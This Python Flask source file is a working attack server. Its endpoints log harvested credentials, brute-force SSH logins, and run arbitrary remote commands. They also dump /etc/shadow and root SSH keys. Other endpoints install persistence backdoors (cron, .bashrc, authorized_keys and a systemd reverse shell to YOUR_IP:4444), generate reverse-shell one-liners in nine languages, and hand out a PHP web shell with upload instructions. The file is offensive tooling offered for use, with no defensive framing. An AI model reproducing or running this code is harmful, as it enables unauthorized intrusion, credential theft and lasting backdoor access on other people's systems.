from flask import Flask, request, jsonify
from flask_cors import CORS
import paramiko
import socket
import threading
import json
import os
import base64
import subprocess
import sys
import time
from datetime import datetime

app = Flask(__name__)
CORS(app)

sessions = {}

# ====== HEALTH ======
@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({"status": "online", "timestamp": datetime.now().isoformat()})

# ====== COLLECT CREDENTIALS ======
@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.json
    with open('creds.log', 'a') as f:
        f.write(json.dumps(data) + '\n')
    return jsonify({"status": "saved"})

# ====== SSH EXPLOIT ======
@app.route('/api/exploit/ssh', methods=['POST'])
def ssh_connect():
    data = request.json
    host = data.get('host')
    port = int(data.get('port', 22))
    username = data.get('username')
    password = data.get('password')

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password, timeout=10)

        session_id = base64.b64encode(os.urandom(12)).decode()[:16]
        sessions[session_id] = client

        # Collect system info
        _, stdout, _ = client.exec_command('uname -a 2>/dev/null; hostname 2>/dev/null; id 2>/dev/null')
        system_info = stdout.read().decode().strip()

        return jsonify({
            "session_id": session_id,
            "status": "connected",
            "system_info": system_info
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/api/exploit/ssh/command', methods=['POST'])
def ssh_command():
    data = request.json
    session_id = data.get('session_id')
    command = data.get('command')

    client = sessions.get(session_id)
    if not client:
        return jsonify({"error": "Session not found"}), 404

    try:
        _, stdout, stderr = client.exec_command(command, timeout=10)
        output = stdout.read().decode() + stderr.read().decode()
        return jsonify({"output": output.strip()})
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/api/exploit/ssh/escalate', methods=['POST'])
def ssh_escalate():
    data = request.json
    session_id = data.get('session_id')
    client = sessions.get(session_id)
    if not client:
        return jsonify({"error": "Session not found"}), 404

    results = []
    checks = [
        'find / -perm -4000 -type f 2>/dev/null | head -20',
        'sudo -l 2>/dev/null',
        'cat /etc/shadow 2>/dev/null | head -5',
        'cat /etc/sudoers 2>/dev/null | head -10',
        'ls -la /etc/cron* 2>/dev/null',
        'cat /etc/passwd 2>/dev/null | head -10',
        'uname -r',
        'cat /proc/version',
        'dpkg -l 2>/dev/null | grep -i "linux-image\\|linux-headers" | head -5',
        'w 2>/dev/null',
        'find / -writable -type f 2>/dev/null | head -20',
        'ls -la /home/*/.ssh/ 2>/dev/null',
        'cat /root/.ssh/id_rsa 2>/dev/null',
        'ls -la /tmp/ 2>/dev/null | head -10',
        'env | grep -i proxy 2>/dev/null'
    ]

    for check in checks:
        try:
            _, stdout, _ = client.exec_command(check, timeout=5)
            out = stdout.read().decode().strip()
            if out:
                technique = check.split('|')[0].strip()[:50]
                results.append({"technique": technique, "status": "found", "data": out[:200]})
        except:
            pass

    return jsonify({"results": results[:20]})

@app.route('/api/exploit/ssh/persist', methods=['POST'])
def ssh_persist():
    data = request.json
    session_id = data.get('session_id')
    client = sessions.get(session_id)
    if not client:
        return jsonify({"error": "Session not found"}), 404

    results = []
    
    # 1. SSH authorized_keys backdoor
    try:
        _, stdout, _ = client.exec_command('cat ~/.ssh/id_rsa.pub 2>/dev/null', timeout=5)
        key = stdout.read().decode().strip()
        if key:
            client.exec_command('mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo "' + key + '" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys')
            results.append({"technique": "SSH authorized_keys", "status": "done"})
    except:
        results.append({"technique": "SSH authorized_keys", "status": "failed"})

    # 2. Cron backdoor
    try:
        client.exec_command('(crontab -l 2>/dev/null; echo "*/10 * * * * nc -e /bin/sh YOUR_IP 4444") | crontab -')
        results.append({"technique": "Cron reverse shell", "status": "done"})
    except:
        results.append({"technique": "Cron reverse shell", "status": "failed"})

    # 3. .bashrc backdoor
    try:
        client.exec_command('echo "nc -e /bin/sh YOUR_IP 4444 &" >> ~/.bashrc')
        results.append({"technique": ".bashrc backdoor", "status": "done"})
    except:
        results.append({"technique": ".bashrc backdoor", "status": "failed"})

    # 4. Systemd service (if root)
    try:
        _, stdout, _ = client.exec_command('id -u', timeout=5)
        uid = stdout.read().decode().strip()
        if uid == '0':
            service = '[Unit]\nDescription=Persist\n[Service]\nExecStart=/usr/bin/python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\\\"YOUR_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"\n[Install]\nWantedBy=multi-user.target\n'
            client.exec_command('echo "' + service + '" > /etc/systemd/system/persist.service && systemctl enable persist.service && systemctl start persist.service')
            results.append({"technique": "Systemd service", "status": "done"})
        else:
            results.append({"technique": "Systemd service", "status": "skipped (not root)"})
    except:
        results.append({"technique": "Systemd service", "status": "failed"})

    return jsonify({"results": results})

@app.route('/api/exploit/ssh/bruteforce', methods=['POST'])
def ssh_bruteforce():
    data = request.json
    host = data.get('host')
    port = int(data.get('port', 22))
    username = data.get('username')
    passwords = data.get('passwords', [])

    if not isinstance(passwords, list):
        passwords = [passwords]

    results = []
    for pwd in passwords[:50]:  # Max 50 passwords
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=pwd, timeout=5)
            client.close()
            results.append({"password": pwd, "status": "success"})
            break
        except paramiko.AuthenticationException:
            results.append({"password": pwd, "status": "failed"})
        except:
            results.append({"password": pwd, "status": "error"})

    return jsonify({"host": host, "username": username, "results": results})

# ====== SCAN ======
def scan_port(host, port, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        if result == 0:
            # Try banner grab
            try:
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.settimeout(2)
                s2.connect((host, port))
                banner = s2.recv(1024).decode('utf-8', errors='ignore').strip()[:100]
                s2.close()
            except:
                banner = ""
            return {"port": port, "status": "open", "banner": banner}
        return {"port": port, "status": "closed"}
    except:
        return {"port": port, "status": "error"}

@app.route('/api/scan', methods=['POST'])
def scan():
    data = request.json
    host = data.get('host')
    ports = data.get('ports', [22, 80, 443])
    threads_count = min(int(data.get('threads', 10)), 50)
    timeout = float(data.get('timeout', 2))

    results = []
    threads = []
    lock = threading.Lock()

    def worker(port_list):
        for p in port_list:
            r = scan_port(host, p, timeout)
            with lock:
                results.append(r)
                if r['status'] == 'open':
                    print(f"[+] {host}:{p} ouvert")

    # Split ports into chunks for threading
    chunk_size = max(1, len(ports) // threads_count)
    chunks = [ports[i:i + chunk_size] for i in range(0, len(ports), chunk_size)]

    for chunk in chunks:
        t = threading.Thread(target=worker, args=(chunk,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return jsonify({"host": host, "results": results, "total": len(results)})

# ====== PAYLOADS ======
@app.route('/api/payloads/generate', methods=['POST'])
def generate_payload():
    data = request.json
    ptype = data.get('type', 'bash')
    ip = data.get('ip', '127.0.0.1')
    port = int(data.get('port', 4444))

    payloads = {
        'bash': f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        'python': f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        'powershell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+\'PS \'+(pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
        'php': f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'nc': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
        'perl': f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}\'',
        'ruby': f'ruby -rsocket -e \'c=TCPSocket.new("{ip}",{port});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
        'nodejs': f'node -e \'require("child_process").exec("bash -i >& /dev/tcp/{ip}/{port} 0>&1")\'',
        'socat': f'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}'
    }

    payload = payloads.get(ptype, payloads['bash'])
    listener = f'nc -lvnp {port}'

    return jsonify({
        "type": ptype,
        "ip": ip,
        "port": port,
        "payload": payload,
        "listener_command": listener
    })

# ====== WEB SHELL ======
@app.route('/api/exploit/webshell', methods=['POST'])
def webshell():
    data = request.json
    url = data.get('url', '').rstrip('/')

    shell_code = '''<?php
$cmd = $_GET['cmd'] ?? $_POST['cmd'] ?? null;
if ($cmd) {
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>
<!-- Usage: ?cmd=whoami -->
'''

    usage = f'Upload this file to {url}/shell.php\nThen visit: {url}/shell.php?cmd=whoami\n\nOr POST: curl -X POST {url}/shell.php -d "cmd=id"'

    return jsonify({
        "shell_code": shell_code,
        "filename": "shell.php",
        "usage": usage
    })

# ====== STATS ======
@app.route('/api/stats', methods=['GET'])
def stats():
    total_creds = 0
    try:
        with open('creds.log', 'r') as f:
            total_creds = sum(1 for _ in f)
    except:
        pass
    
    return jsonify({
        "sessions_active": len(sessions),
        "credentials_collected": total_creds,
        "uptime": datetime.now().isoformat()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
